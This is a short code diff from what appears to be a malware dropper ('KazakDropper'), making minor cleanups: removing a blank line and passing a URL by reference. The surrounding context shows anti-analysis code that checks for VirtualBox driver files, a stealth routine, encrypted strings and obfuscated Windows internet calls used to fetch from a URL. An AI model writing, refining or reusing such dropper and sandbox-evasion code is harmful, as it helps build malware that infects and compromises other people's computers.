@@ -50,7 +50,6 @@ bool KazakDropper::EvadeAnalysis()
 
 	else if (std::filesystem::exists(enc("C:\\Windows\\System32\\vboxdisp.dll")))
 		return TRUE;
-
 }
 
 void KazakDropper::Stealth()
@@ -78,7 +77,7 @@ std::string KazakUtils::replace_all(std::string subject, const std::string& sear
 	return subject;
 }
 
-std::string KazakUtils::StringWrapper(const std::string url)
+std::string KazakUtils::StringWrapper(const std::string& url)
 {
 	const HINTERNET connection = li(InternetOpenA)(enc("list_access\r\n"), INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, NULL);
 	std::string rtn;
